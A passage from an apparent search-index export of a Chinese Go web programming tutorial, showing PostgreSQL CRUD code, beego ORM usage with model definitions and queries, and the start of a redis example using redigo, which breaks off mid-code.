(\n\"database/sql\"\n\"fmt\"\n\n_ \"github.com/lib/pq\"\n)\n\nfunc main() {\ndb, err := sql.Open(\"postgres\", \"user=astaxie password=astaxie dbname=test sslmode=disable\")\ncheckErr(err)\n\n//\u63d2\u5165\u6570\u636e\nstmt, err := db.Prepare(\"INSERT INTO userinfo(username,department,created) VALUES($1,$2,$3) RETURNING uid\")\ncheckErr(err)\n\nres, err := stmt.Exec(\"astaxie\", \"\u7814\u53d1\u90e8\u95e8\", \"2012-12-09\")\ncheckErr(err)\n\n//pg\u4e0d\u652f\u6301\u8fd9\u4e2a\u51fd\u6570\uff0c\u56e0\u4e3a\u4ed6\u6ca1\u6709\u7c7b\u4f3cMySQL\u7684\u81ea\u589eID\n// id, err := res.LastInsertId()\n// checkErr(err)\n// fmt.Println(id)\n\nvar lastInsertId int\nerr = db.QueryRow(\"INSERT INTO userinfo(username,departname,created) VALUES($1,$2,$3) returning uid;\", \"astaxie\", \"\u7814\u53d1\u90e8\u95e8\", \"2012-12-09\").Scan(&amp;lastInsertId)\ncheckErr(err)\nfmt.Println(\"\u6700\u540e\u63d2\u5165id =\", lastInsertId)\n\n\n//\u66f4\u65b0\u6570\u636e\nstmt, err = db.Prepare(\"update userinfo set username=$1 where uid=$2\")\ncheckErr(err)\n\nres, err = stmt.Exec(\"astaxieupdate\", 1)\ncheckErr(err)\n\naffect, err := res.RowsAffected()\ncheckErr(err)\n\nfmt.Println(affect)\n\n//\u67e5\u8be2\u6570\u636e\nrows, err := db.Query(\"SELECT * FROM userinfo\")\ncheckErr(err)\n\nfor rows.Next() {\nvar uid int\nvar username string\nvar department string\nvar created string\nerr = rows.Scan(&amp;uid, &amp;username, &amp;department, &amp;created)\ncheckErr(err)\nfmt.Println(uid)\nfmt.Println(username)\nfmt.Println(department)\nfmt.Println(created)\n}\n\n//\u5220\u9664\u6570\u636e\nstmt, err = db.Prepare(\"delete from userinfo where uid=$1\")\ncheckErr(err)\n\nres, err = stmt.Exec(1)\ncheckErr(err)\n\naffect, err = res.RowsAffected()\ncheckErr(err)\n\nfmt.Println(affect)\n\ndb.Close()\n\n}\n\nfunc checkErr(err error) {\nif err != nil {\npanic(err)\n}\n}\n</code></pre> <p>\u4ece\u4e0a\u9762\u7684\u4ee3\u7801\u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0cPostgreSQL\u662f\u901a\u8fc7<code>$1</code>,<code>$2</code>\u8fd9\u79cd\u65b9\u5f0f\u6765\u6307\u5b9a\u8981\u4f20\u9012\u7684\u53c2\u6570\uff0c\u800c\u4e0d\u662fMySQL\u4e2d\u7684<code>?</code>\uff0c\u53e6\u5916\u5728sql.Open\u4e2d\u7684dsn\u4fe1\u606f\u7684\u683c\u5f0f\u4e5f\u4e0eMySQL\u7684\u9a71\u52a8\u4e2d\u7684dsn\u683c\u5f0f\u4e0d\u4e00\u6837\uff0c\u6240\u4ee5\u5728\u4f7f\u7528\u65f6\u8bf7\u6ce8\u610f\u5b83\u4eec\u7684\u5dee\u5f02\u3002</p> <p>\u8fd8\u6709pg\u4e0d\u652f\u6301LastInsertId\u51fd\u6570\uff0c\u56e0\u4e3aPostgreSQL\u5185\u90e8\u6ca1\u6709\u5b9e\u73b0\u7c7b\u4f3cMySQL\u7684\u81ea\u589eID\u8fd4\u56de\uff0c\u5176\u4ed6\u7684\u4ee3\u7801\u51e0\u4e4e\u662f\u4e00\u6a21\u4e00\u6837\u3002</p>"},{"location":"05.4/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: \u4f7f\u7528SQLite\u6570\u636e\u5e93</li> <li>\u4e0b\u4e00\u8282: \u4f7f\u7528Beego orm\u5e93\u8fdb\u884cORM\u5f00\u53d1</li> </ul>"},{"location":"05.5/","title":"5.5 \u4f7f\u7528Beego orm\u5e93\u8fdb\u884cORM\u5f00\u53d1","text":"<p>beego orm\u662f\u6211\u5f00\u53d1\u7684\u4e00\u4e2aGo\u8fdb\u884cORM\u64cd\u4f5c\u7684\u5e93\uff0c\u5b83\u91c7\u7528\u4e86Go style\u65b9\u5f0f\u5bf9\u6570\u636e\u5e93\u8fdb\u884c\u64cd\u4f5c\uff0c\u5b9e\u73b0\u4e86struct\u5230\u6570\u636e\u8868\u8bb0\u5f55\u7684\u6620\u5c04\u3002beego orm\u662f\u4e00\u4e2a\u5341\u5206\u8f7b\u91cf\u7ea7\u7684Go ORM\u6846\u67b6\uff0c\u5f00\u53d1\u8fd9\u4e2a\u5e93\u7684\u672c\u610f\u964d\u4f4e\u590d\u6742\u7684ORM\u5b66\u4e60\u66f2\u7ebf\uff0c\u5c3d\u53ef\u80fd\u5728ORM\u7684\u8fd0\u884c\u6548\u7387\u548c\u529f\u80fd\u4e4b\u95f4\u5bfb\u6c42\u4e00\u4e2a\u5e73\u8861\uff0cbeego orm\u662f\u76ee\u524d\u5f00\u6e90\u7684Go ORM\u6846\u67b6\u4e2d\u5b9e\u73b0\u6bd4\u8f83\u5b8c\u6574\u7684\u4e00\u4e2a\u5e93\uff0c\u800c\u4e14\u8fd0\u884c\u6548\u7387\u76f8\u5f53\u4e0d\u9519\uff0c\u529f\u80fd\u4e5f\u57fa\u672c\u80fd\u6ee1\u8db3\u9700\u6c42\u3002</p> <p>beego orm\u662f\u652f\u6301database/sql\u6807\u51c6\u63a5\u53e3\u7684ORM\u5e93\uff0c\u6240\u4ee5\u7406\u8bba\u4e0a\u6765\u8bf4\uff0c\u53ea\u8981\u6570\u636e\u5e93\u9a71\u52a8\u652f\u6301database/sql\u63a5\u53e3\u5c31\u53ef\u4ee5\u65e0\u7f1d\u7684\u63a5\u5165beego orm\u3002\u76ee\u524d\u6211\u6d4b\u8bd5\u8fc7\u7684\u9a71\u52a8\u5305\u62ec\u4e0b\u9762\u51e0\u4e2a\uff1a</p> <p>Mysql: github/go-mysql-driver/mysql</p> <p>PostgreSQL: github.com/lib/pq</p> <p>SQLite: github.com/mattn/go-sqlite3</p> <p>Mysql: github.com/ziutek/mymysql/godrv</p> <p>\u6682\u672a\u652f\u6301\u6570\u636e\u5e93:</p> <p>MsSql: github.com/denisenkom/go-mssqldb</p> <p>MS ADODB: github.com/mattn/go-adodb</p> <p>Oracle: github.com/mattn/go-oci8</p> <p>ODBC: bitbucket.org/miquella/mgodbc</p>"},{"location":"05.5/#_1","title":"\u5b89\u88c5","text":"<p>beego orm\u652f\u6301go get\u65b9\u5f0f\u5b89\u88c5\uff0c\u662f\u5b8c\u5168\u6309\u7167Go Style\u7684\u65b9\u5f0f\u6765\u5b9e\u73b0\u7684\u3002</p> <pre><code>go get github.com/astaxie/beego\n</code></pre>"},{"location":"05.5/#_2","title":"\u5982\u4f55\u521d\u59cb\u5316","text":"<p>\u9996\u5148\u4f60\u9700\u8981import\u76f8\u5e94\u7684\u6570\u636e\u5e93\u9a71\u52a8\u5305\u3001database/sql\u6807\u51c6\u63a5\u53e3\u5305\u4ee5\u53cabeego orm\u5305\uff0c\u5982\u4e0b\u6240\u793a\uff1a <pre><code>import (\n\"database/sql\"\n\"github.com/astaxie/beego/orm\"\n_ \"github.com/go-sql-driver/mysql\"\n)\n\nfunc init() {\n//\u6ce8\u518c\u9a71\u52a8\norm.RegisterDriver(\"mysql\", orm.DRMySQL)\n//\u8bbe\u7f6e\u9ed8\u8ba4\u6570\u636e\u5e93\norm.RegisterDataBase(\"default\", \"mysql\", \"root:root@/my_db?charset=utf8\", 30)\n//\u6ce8\u518c\u5b9a\u4e49\u7684model\norm.RegisterModel(new(User))\n\n// \u521b\u5efatable\norm.RunSyncdb(\"default\", false, true)\n}\n</code></pre></p> <p>PostgreSQL \u914d\u7f6e:</p> <pre><code>//\u5bfc\u5165\u9a71\u52a8\n// _ \"github.com/lib/pq\"\n\n// \u6ce8\u518c\u9a71\u52a8\norm.RegisterDriver(\"postgres\", orm.DR_Postgres) // \u8bbe\u7f6e\u9ed8\u8ba4\u6570\u636e\u5e93\n//PostgresQL\u7528\u6237\uff1apostgres \uff0c\u5bc6\u7801\uff1azxxx \uff0c \u6570\u636e\u5e93\u540d\u79f0\uff1atest \uff0c \u6570\u636e\u5e93\u522b\u540d\uff1adefault\norm.RegisterDataBase(\"default\", \"postgres\", \"user=postgres password=zxxx dbname=test host=127.0.0.1 port=5432 sslmode=disable\")\n</code></pre> <p>MySQL \u914d\u7f6e:</p> <p><pre><code>//\u5bfc\u5165\u9a71\u52a8\n//_ \"github.com/go-sql-driver/mysql\"\n\n//\u6ce8\u518c\u9a71\u52a8\norm.RegisterDriver(\"mysql\", orm.DR_MySQL)\n\n// \u8bbe\u7f6e\u9ed8\u8ba4\u6570\u636e\u5e93\n//mysql\u7528\u6237\uff1aroot \uff0c\u5bc6\u7801\uff1azxxx \uff0c \u6570\u636e\u5e93\u540d\u79f0\uff1atest \uff0c \u6570\u636e\u5e93\u522b\u540d\uff1adefault\norm.RegisterDataBase(\"default\", \"mysql\", \"root:zxxx@/test?charset=utf8\")\n</code></pre> Sqlite \u914d\u7f6e: <pre><code>//\u5bfc\u5165\u9a71\u52a8\n//_ \"github.com/mattn/go-sqlite3\"\n\n//\u6ce8\u518c\u9a71\u52a8\norm.RegisterDriver(\"sqlite\", orm.DR_Sqlite)\n\n// \u8bbe\u7f6e\u9ed8\u8ba4\u6570\u636e\u5e93\n//\u6570\u636e\u5e93\u5b58\u653e\u4f4d\u7f6e\uff1a./datas/test.db \uff0c \u6570\u636e\u5e93\u522b\u540d\uff1adefault\norm.RegisterDataBase(\"default\", \"sqlite3\", \"./datas/test.db\")\n</code></pre></p> <p>\u5bfc\u5165\u5fc5\u987b\u7684package\u4e4b\u540e,\u6211\u4eec\u9700\u8981\u6253\u5f00\u5230\u6570\u636e\u5e93\u7684\u94fe\u63a5\uff0c\u7136\u540e\u521b\u5efa\u4e00\u4e2abeego orm\u5bf9\u8c61\uff08\u4ee5MySQL\u4e3a\u4f8b)\uff0c\u5982\u4e0b\u6240\u793a beego orm:</p> <pre><code>func main() {\no := orm.NewOrm()\n}\n</code></pre> <p>\u7b80\u5355\u793a\u4f8b: <pre><code>package main\n\nimport (\n\"fmt\"\n\"github.com/astaxie/beego/orm\"\n_ \"github.com/go-sql-driver/mysql\" // \u5bfc\u5165\u6570\u636e\u5e93\u9a71\u52a8\n)\n\n// Model Struct\ntype User struct {\nId   int\nName string `orm:\"size(100)\"`\n}\n\nfunc init() {\n// \u8bbe\u7f6e\u9ed8\u8ba4\u6570\u636e\u5e93\norm.RegisterDataBase(\"default\", \"mysql\", \"root:root@/my_db?charset=utf8\", 30)\n\n// \u6ce8\u518c\u5b9a\u4e49\u7684 model\norm.RegisterModel(new(User))\n//RegisterModel \u4e5f\u53ef\u4ee5\u540c\u65f6\u6ce8\u518c\u591a\u4e2a model\n//orm.RegisterModel(new(User), new(Profile), new(Post))\n\n// \u521b\u5efa table\norm.RunSyncdb(\"default\", false, true)\n}\n\nfunc main() {\no := orm.NewOrm()\n\nuser := User{Name: \"slene\"}\n\n// \u63d2\u5165\u8868\nid, err := o.Insert(&amp;user)\nfmt.Printf(\"ID: %d, ERR: %v\\n\", id, err)\n\n// \u66f4\u65b0\u8868\nuser.Name = \"astaxie\"\nnum, err := o.Update(&amp;user)\nfmt.Printf(\"NUM: %d, ERR: %v\\n\", num, err)\n\n// \u8bfb\u53d6 one\nu := User{Id: user.Id}\nerr = o.Read(&amp;u)\nfmt.Printf(\"ERR: %v\\n\", err)\n\n// \u5220\u9664\u8868\nnum, err = o.Delete(&amp;u)\nfmt.Printf(\"NUM: %d, ERR: %v\\n\", num, err)\n}\n</code></pre></p> <p>SetMaxIdleConns</p> <p>\u6839\u636e\u6570\u636e\u5e93\u7684\u522b\u540d\uff0c\u8bbe\u7f6e\u6570\u636e\u5e93\u7684\u6700\u5927\u7a7a\u95f2\u8fde\u63a5 <pre><code>orm.SetMaxIdleConns(\"default\", 30)\n</code></pre> SetMaxOpenConns</p> <p>\u6839\u636e\u6570\u636e\u5e93\u7684\u522b\u540d\uff0c\u8bbe\u7f6e\u6570\u636e\u5e93\u7684\u6700\u5927\u6570\u636e\u5e93\u8fde\u63a5 (go &gt;= 1.2) <pre><code>orm.SetMaxOpenConns(\"default\", 30)\n</code></pre></p> <p>\u76ee\u524dbeego orm\u652f\u6301\u6253\u5370\u8c03\u8bd5\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u7684\u4ee3\u7801\u5b9e\u73b0\u8c03\u8bd5 <pre><code> orm.Debug = true\n</code></pre></p> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u7684\u4f8b\u5b50\u91c7\u7528\u524d\u9762\u7684\u6570\u636e\u5e93\u8868User\uff0c\u73b0\u5728\u6211\u4eec\u5efa\u7acb\u76f8\u5e94\u7684struct <pre><code>type Userinfo struct {\nUid         int `orm:\"PK\"` //\u5982\u679c\u8868\u7684\u4e3b\u952e\u4e0d\u662fid\uff0c\u90a3\u4e48\u9700\u8981\u52a0\u4e0apk\u6ce8\u91ca\uff0c\u663e\u5f0f\u7684\u8bf4\u8fd9\u4e2a\u5b57\u6bb5\u662f\u4e3b\u952e\nUsername    string\nDepartname  string\nCreated     time.Time\n}\n\ntype User struct {\nUid         int `orm:\"PK\"` //\u5982\u679c\u8868\u7684\u4e3b\u952e\u4e0d\u662fid\uff0c\u90a3\u4e48\u9700\u8981\u52a0\u4e0apk\u6ce8\u91ca\uff0c\u663e\u5f0f\u7684\u8bf4\u8fd9\u4e2a\u5b57\u6bb5\u662f\u4e3b\u952e\nName        string\nProfile     *Profile   `orm:\"rel(one)\"` // OneToOne relation\nPost        []*Post `orm:\"reverse(many)\"` // \u8bbe\u7f6e\u4e00\u5bf9\u591a\u7684\u53cd\u5411\u5173\u7cfb\n}\n\ntype Profile struct {\nId          int\nAge         int16\nUser        *User   `orm:\"reverse(one)\"` // \u8bbe\u7f6e\u4e00\u5bf9\u4e00\u53cd\u5411\u5173\u7cfb(\u53ef\u9009)\n}\n\ntype Post struct {\nId    int\nTitle string\nUser  *User  `orm:\"rel(fk)\"`\nTags  []*Tag `orm:\"rel(m2m)\"`    //\u8bbe\u7f6e\u4e00\u5bf9\u591a\u5173\u7cfb\n}\n\ntype Tag struct {\nId    int\nName  string\nPosts []*Post `orm:\"reverse(many)\"`\n}\n\nfunc init() {\n// \u9700\u8981\u5728init\u4e2d\u6ce8\u518c\u5b9a\u4e49\u7684model\norm.RegisterModel(new(Userinfo),new(User), new(Profile), new(Post), new(Tag))\n}\n</code></pre></p> <p>\u6ce8\u610f\u4e00\u70b9\uff0cbeego orm\u9488\u5bf9\u9a7c\u5cf0\u547d\u540d\u4f1a\u81ea\u52a8\u5e2e\u4f60\u8f6c\u5316\u6210\u4e0b\u5212\u7ebf\u5b57\u6bb5\uff0c\u4f8b\u5982\u4f60\u5b9a\u4e49\u4e86struct\u540d\u5b57\u4e3a<code>UserInfo</code>\uff0c\u90a3\u4e48\u8f6c\u5316\u6210\u5e95\u5c42\u5b9e\u73b0\u7684\u65f6\u5019\u662f<code>user_info</code>\uff0c\u5b57\u6bb5\u547d\u540d\u4e5f\u9075\u5faa\u8be5\u89c4\u5219\u3002</p>"},{"location":"05.5/#_3","title":"\u63d2\u5165\u6570\u636e","text":"<p>\u4e0b\u9762\u7684\u4ee3\u7801\u6f14\u793a\u4e86\u5982\u4f55\u63d2\u5165\u4e00\u6761\u8bb0\u5f55\uff0c\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u64cd\u4f5c\u7684\u662fstruct\u5bf9\u8c61\uff0c\u800c\u4e0d\u662f\u539f\u751f\u7684sql\u8bed\u53e5\uff0c\u6700\u540e\u901a\u8fc7\u8c03\u7528Insert\u63a5\u53e3\u5c06\u6570\u636e\u4fdd\u5b58\u5230\u6570\u636e\u5e93\u3002 <pre><code>o := orm.NewOrm()\nvar user User\nuser.Name = \"zxxx\"\nuser.Departname = \"zxxx\"\n\nid, err := o.Insert(&amp;user)\nif err == nil {\nfmt.Println(id)\n}\n</code></pre> \u6211\u4eec\u770b\u5230\u63d2\u5165\u4e4b\u540e<code>user.Uid</code>\u5c31\u662f\u63d2\u5165\u6210\u529f\u4e4b\u540e\u7684\u81ea\u589eID\u3002</p> <p>\u540c\u65f6\u63d2\u5165\u591a\u4e2a\u5bf9\u8c61:InsertMulti</p> <p>\u7c7b\u4f3csql\u8bed\u53e5 <pre><code>insert into table (name, age) values(\"slene\", 28),(\"astaxie\", 30),(\"unknown\", 20)\n</code></pre> \u7b2c\u4e00\u4e2a\u53c2\u6570 bulk \u4e3a\u5e76\u5217\u63d2\u5165\u7684\u6570\u91cf\uff0c\u7b2c\u4e8c\u4e2a\u4e3a\u5bf9\u8c61\u7684slice</p> <p>\u8fd4\u56de\u503c\u4e3a\u6210\u529f\u63d2\u5165\u7684\u6570\u91cf <pre><code>users := []User{\n{Name: \"slene\"},\n{Name: \"astaxie\"},\n{Name: \"unknown\"},\n...\n}\nsuccessNums, err := o.InsertMulti(100, users)\n</code></pre> bulk \u4e3a 1 \u65f6\uff0c\u5c06\u4f1a\u987a\u5e8f\u63d2\u5165 slice \u4e2d\u7684\u6570\u636e</p>"},{"location":"05.5/#_4","title":"\u66f4\u65b0\u6570\u636e","text":"<p>\u7ee7\u7eed\u4e0a\u9762\u7684\u4f8b\u5b50\u6765\u6f14\u793a\u66f4\u65b0\u64cd\u4f5c\uff0c\u73b0\u5728user\u7684\u4e3b\u952e\u5df2\u7ecf\u6709\u503c\u4e86\uff0c\u6b64\u65f6\u8c03\u7528Insert\u63a5\u53e3\uff0cbeego orm\u5185\u90e8\u4f1a\u81ea\u52a8\u8c03\u7528update\u4ee5\u8fdb\u884c\u6570\u636e\u7684\u66f4\u65b0\u800c\u975e\u63d2\u5165\u64cd\u4f5c\u3002 <pre><code>o := orm.NewOrm()\nuser := User{Uid: 1}\nif o.Read(&amp;user) == nil {\nuser.Name = \"MyName\"\nif num, err := o.Update(&amp;user); err == nil {\nfmt.Println(num)\n}\n}\n</code></pre> Update \u9ed8\u8ba4\u66f4\u65b0\u6240\u6709\u7684\u5b57\u6bb5\uff0c\u53ef\u4ee5\u66f4\u65b0\u6307\u5b9a\u7684\u5b57\u6bb5\uff1a <pre><code>// \u53ea\u66f4\u65b0 Name\no.Update(&amp;user, \"Name\")\n// \u6307\u5b9a\u591a\u4e2a\u5b57\u6bb5\n// o.Update(&amp;user, \"Field1\", \"Field2\", ...)\n</code></pre></p> <p>Where: \u7528\u6765\u8bbe\u7f6e\u6761\u4ef6\uff0c\u652f\u6301\u591a\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u5982\u679c\u4e3a\u6574\u6570\uff0c\u76f8\u5f53\u4e8e\u8c03\u7528\u4e86Where(\"\u4e3b\u952e=?\",\u503c)\u3002</p>"},{"location":"05.5/#_5","title":"\u67e5\u8be2\u6570\u636e","text":"<p>beego orm\u7684\u67e5\u8be2\u63a5\u53e3\u6bd4\u8f83\u7075\u6d3b\uff0c\u5177\u4f53\u4f7f\u7528\u8bf7\u770b\u4e0b\u9762\u7684\u4f8b\u5b50</p> <p>\u4f8b\u5b501\uff0c\u6839\u636e\u4e3b\u952e\u83b7\u53d6\u6570\u636e\uff1a <pre><code>o := orm.NewOrm()\nvar user User\n\nuser := User{Id: 1}\n\nerr = o.Read(&amp;user)\n\nif err == orm.ErrNoRows {\nfmt.Println(\"\u67e5\u8be2\u4e0d\u5230\")\n} else if err == orm.ErrMissPK {\nfmt.Println(\"\u627e\u4e0d\u5230\u4e3b\u952e\")\n} else {\nfmt.Println(user.Id, user.Name)\n}\n</code></pre></p> <p>\u4f8b\u5b502\uff1a <pre><code>o := orm.NewOrm()\nvar user User\n\nqs := o.QueryTable(user) // \u8fd4\u56de QuerySeter\nqs.Filter(\"id\", 1) // WHERE id = 1\nqs.Filter(\"profile__age\", 18) // WHERE profile.age = 18\n</code></pre> \u4f8b\u5b503\uff0cWHERE IN\u67e5\u8be2\u6761\u4ef6\uff1a <pre><code>qs.Filter(\"profile__age__in\", 18, 20) // WHERE profile.age IN (18, 20)\n</code></pre> \u4f8b\u5b504\uff0c\u66f4\u52a0\u590d\u6742\u7684\u6761\u4ef6\uff1a <pre><code>qs.Filter(\"profile__age__in\", 18, 20).Exclude(\"profile__lt\", 1000)\n// WHERE profile.age IN (18, 20) AND NOT profile_id &lt; 1000\n</code></pre></p> <p>\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u63a5\u53e3\u83b7\u53d6\u591a\u6761\u6570\u636e\uff0c\u8bf7\u770b\u793a\u4f8b</p> <p>\u4f8b\u5b501\uff0c\u6839\u636e\u6761\u4ef6age&gt;17\uff0c\u83b7\u53d620\u4f4d\u7f6e\u5f00\u59cb\u768410\u6761\u6570\u636e\u7684\u6570\u636e <pre><code>var allusers []User\nqs.Filter(\"profile__age__gt\", 17)\n// WHERE profile.age &gt; 17\n</code></pre> \u4f8b\u5b502\uff0climit\u9ed8\u8ba4\u4ece10\u5f00\u59cb\uff0c\u83b7\u53d610\u6761\u6570\u636e <pre><code>qs.Limit(10, 20)\n// LIMIT 10 OFFSET 20 \u6ce8\u610f\u8ddfSQL\u53cd\u8fc7\u6765\u7684\n</code></pre></p>"},{"location":"05.5/#_6","title":"\u5220\u9664\u6570\u636e","text":"<p>beedb\u63d0\u4f9b\u4e86\u4e30\u5bcc\u7684\u5220\u9664\u6570\u636e\u63a5\u53e3\uff0c\u8bf7\u770b\u4e0b\u9762\u7684\u4f8b\u5b50</p> <p>\u4f8b\u5b501\uff0c\u5220\u9664\u5355\u6761\u6570\u636e <pre><code>o := orm.NewOrm()\nif num, err := o.Delete(&amp;User{Id: 1}); err == nil {\nfmt.Println(num)\n}\n</code></pre> Delete \u64cd\u4f5c\u4f1a\u5bf9\u53cd\u5411\u5173\u7cfb\u8fdb\u884c\u64cd\u4f5c\uff0c\u6b64\u4f8b\u4e2d Post \u62e5\u6709\u4e00\u4e2a\u5230 User \u7684\u5916\u952e\u3002\u5220\u9664 User \u7684\u65f6\u5019\u3002\u5982\u679c on_delete \u8bbe\u7f6e\u4e3a\u9ed8\u8ba4\u7684\u7ea7\u8054\u64cd\u4f5c\uff0c\u5c06\u5220\u9664\u5bf9\u5e94\u7684 Post</p>"},{"location":"05.5/#_7","title":"\u5173\u8054\u67e5\u8be2","text":"<p>\u6709\u4e9b\u5e94\u7528\u5374\u9700\u8981\u7528\u5230\u8fde\u63a5\u67e5\u8be2\uff0c\u6240\u4ee5\u73b0\u5728beego orm\u63d0\u4f9b\u4e86\u4e00\u4e2a\u7b80\u964b\u7684\u5b9e\u73b0\u65b9\u6848\uff1a <pre><code>type Post struct {\nId    int    `orm:\"auto\"`\nTitle string `orm:\"size(100)\"`\nUser  *User  `orm:\"rel(fk)\"`\n}\n\nvar posts []*Post\nqs := o.QueryTable(\"post\")\nnum, err := qs.Filter(\"User__Name\", \"slene\").All(&amp;posts)\n</code></pre> \u4e0a\u9762\u4ee3\u7801\u4e2d\u6211\u4eec\u770b\u5230\u4e86\u4e00\u4e2astruct\u5173\u8054\u67e5\u8be2</p>"},{"location":"05.5/#groupbyhaving","title":"GroupBy\u548cHaving","text":"<p>\u9488\u5bf9\u6709\u4e9b\u5e94\u7528\u9700\u8981\u7528\u5230group by\u7684\u529f\u80fd\uff0cbeego orm\u4e5f\u63d0\u4f9b\u4e86\u4e00\u4e2a\u7b80\u964b\u7684\u5b9e\u73b0 <pre><code>qs.OrderBy(\"id\", \"-profile__age\")\n// ORDER BY id ASC, profile.age DESC\n\nqs.OrderBy(\"-profile__age\", \"profile\")\n// ORDER BY profile.age DESC, profile_id ASC\n</code></pre> \u4e0a\u9762\u7684\u4ee3\u7801\u4e2d\u51fa\u73b0\u4e86\u4e24\u4e2a\u65b0\u63a5\u53e3\u51fd\u6570</p> <p>GroupBy:\u7528\u6765\u6307\u5b9a\u8fdb\u884cgroupby\u7684\u5b57\u6bb5</p> <p>Having:\u7528\u6765\u6307\u5b9ahaving\u6267\u884c\u7684\u65f6\u5019\u7684\u6761\u4ef6</p>"},{"location":"05.5/#sql","title":"\u4f7f\u7528\u539f\u751fsql","text":"<p>\u7b80\u5355\u793a\u4f8b:</p> <pre><code>o := orm.NewOrm()\nvar r orm.RawSeter\nr = o.Raw(\"UPDATE user SET name = ? WHERE name = ?\", \"testing\", \"slene\")\n</code></pre> <p>\u590d\u6742\u539f\u751fsql\u4f7f\u7528:</p> <pre><code>func (m *User) Query(name string) user []User {\nvar o orm.Ormer\nvar rs orm.RawSeter\no = orm.NewOrm()\nrs = o.Raw(\"SELECT * FROM user \"+\n\"WHERE name=? AND uid&gt;10 \"+\n\"ORDER BY uid DESC \"+\n\"LIMIT 100\", name)\n//var user []User\nnum, err := rs.QueryRows(&amp;user)\nif err != nil {\nfmt.Println(err)\n} else {\nfmt.Println(num)\n//return user\n}\nreturn\n}   </code></pre> <p>\u66f4\u591a\u8bf4\u660e,\u8bf7\u5230beego.me</p>"},{"location":"05.5/#_8","title":"\u8fdb\u4e00\u6b65\u7684\u53d1\u5c55","text":"<p>\u76ee\u524dbeego orm\u5df2\u7ecf\u83b7\u5f97\u4e86\u5f88\u591a\u6765\u81ea\u56fd\u5185\u5916\u7528\u6237\u7684\u53cd\u9988\uff0c\u6211\u76ee\u524d\u4e5f\u6b63\u5728\u8003\u8651\u652f\u6301\u66f4\u591a\u6570\u636e\u5e93\uff0c\u63a5\u4e0b\u6765\u4f1a\u5728\u66f4\u591a\u65b9\u9762\u8fdb\u884c\u6539\u8fdb</p>"},{"location":"05.5/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: \u4f7f\u7528PostgreSQL\u6570\u636e\u5e93</li> <li>\u4e0b\u4e00\u8282: NOSQL\u6570\u636e\u5e93\u64cd\u4f5c</li> </ul>"},{"location":"05.6/","title":"5.6 NOSQL\u6570\u636e\u5e93\u64cd\u4f5c","text":"<p>NoSQL(Not Only SQL)\uff0c\u6307\u7684\u662f\u975e\u5173\u7cfb\u578b\u7684\u6570\u636e\u5e93\u3002\u968f\u7740Web2.0\u7684\u5174\u8d77\uff0c\u4f20\u7edf\u7684\u5173\u7cfb\u6570\u636e\u5e93\u5728\u5e94\u4ed8Web2.0\u7f51\u7ad9\uff0c\u7279\u522b\u662f\u8d85\u5927\u89c4\u6a21\u548c\u9ad8\u5e76\u53d1\u7684SNS\u7c7b\u578b\u7684Web2.0\u7eaf\u52a8\u6001\u7f51\u7ad9\u5df2\u7ecf\u663e\u5f97\u529b\u4e0d\u4ece\u5fc3\uff0c\u66b4\u9732\u4e86\u5f88\u591a\u96be\u4ee5\u514b\u670d\u7684\u95ee\u9898\uff0c\u800c\u975e\u5173\u7cfb\u578b\u7684\u6570\u636e\u5e93\u5219\u7531\u4e8e\u5176\u672c\u8eab\u7684\u7279\u70b9\u5f97\u5230\u4e86\u975e\u5e38\u8fc5\u901f\u7684\u53d1\u5c55\u3002</p> <p>\u800cGo\u8bed\u8a00\u4f5c\u4e3a21\u4e16\u7eaa\u7684C\u8bed\u8a00\uff0c\u5bf9NOSQL\u7684\u652f\u6301\u4e5f\u662f\u5f88\u597d\uff0c\u76ee\u524d\u6d41\u884c\u7684NOSQL\u4e3b\u8981\u6709redis\u3001mongoDB\u3001Cassandra\u548cMembase\u7b49\u3002\u8fd9\u4e9b\u6570\u636e\u5e93\u90fd\u6709\u9ad8\u6027\u80fd\u3001\u9ad8\u5e76\u53d1\u8bfb\u5199\u7b49\u7279\u70b9\uff0c\u76ee\u524d\u5df2\u7ecf\u5e7f\u6cdb\u5e94\u7528\u4e8e\u5404\u79cd\u5e94\u7528\u4e2d\u3002\u6211\u63a5\u4e0b\u6765\u4e3b\u8981\u8bb2\u89e3\u4e00\u4e0bredis\u548cmongoDB\u7684\u64cd\u4f5c\u3002</p>"},{"location":"05.6/#redis","title":"redis","text":"<p>redis\u662f\u4e00\u4e2akey-value\u5b58\u50a8\u7cfb\u7edf\u3002\u548cMemcached\u7c7b\u4f3c\uff0c\u5b83\u652f\u6301\u5b58\u50a8\u7684value\u7c7b\u578b\u76f8\u5bf9\u66f4\u591a\uff0c\u5305\u62ecstring(\u5b57\u7b26\u4e32)\u3001list(\u94fe\u8868)\u3001set(\u96c6\u5408)\u548czset(\u6709\u5e8f\u96c6\u5408)\u3002</p> <p>\u76ee\u524d\u5e94\u7528redis\u6700\u5e7f\u6cdb\u7684\u5e94\u8be5\u662f\u65b0\u6d6a\u5fae\u535a\u5e73\u53f0\uff0c\u5176\u6b21\u8fd8\u6709Facebook\u6536\u8d2d\u7684\u56fe\u7247\u793e\u4ea4\u7f51\u7ad9instagram\u3002\u4ee5\u53ca\u5176\u4ed6\u4e00\u4e9b\u6709\u540d\u7684\u4e92\u8054\u7f51\u4f01\u4e1a</p> <p>Go\u76ee\u524d\u652f\u6301redis\u7684\u9a71\u52a8\u6709\u5982\u4e0b - https://github.com/gomodule/redigo (\u63a8\u8350) - https://github.com/go-redis/redis - https://github.com/hoisie/redis - https://github.com/alphazero/Go-Redis - https://github.com/simonz05/godis</p> <p>\u6211\u4ee5redigo\u9a71\u52a8\u4e3a\u4f8b\u6765\u6f14\u793a\u5982\u4f55\u8fdb\u884c\u6570\u636e\u7684\u64cd\u4f5c: <pre><code>package main\n\nimport (\n\"fmt\"\n\"os\"\n\"os/signal\"\n\"syscall\"\n\"time\"\n\n\"github.com/gomodule/redigo/redis\"\n)\n\nvar (\nPool *redis.Pool\n)\n\nfunc init() {\nredisHost := \":6379\"\nPool = newPool(redisHost)\nclose()\n}\n\nfunc newPool(server string) *redis.Pool {\n\nreturn &amp;redis.Pool{\n\nMaxIdle:     